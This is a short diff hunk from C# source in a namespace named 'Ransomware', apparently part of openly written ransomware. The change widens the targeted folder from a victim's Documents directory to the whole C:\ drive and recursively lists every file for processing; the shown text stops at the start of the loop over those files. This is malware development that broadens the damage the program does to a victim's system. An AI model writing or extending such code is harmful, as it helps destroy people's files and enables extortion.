@@ -8,7 +8,7 @@ namespace Ransomware
     {
         static void Main(string[] args)
         {
-            string directory = @"C:\Users\Victim\Documents";
+            string directory = @"C:\";
             string[] files = Directory.GetFiles(directory, "*.*", SearchOption.AllDirectories);
 
             foreach (string file in files)
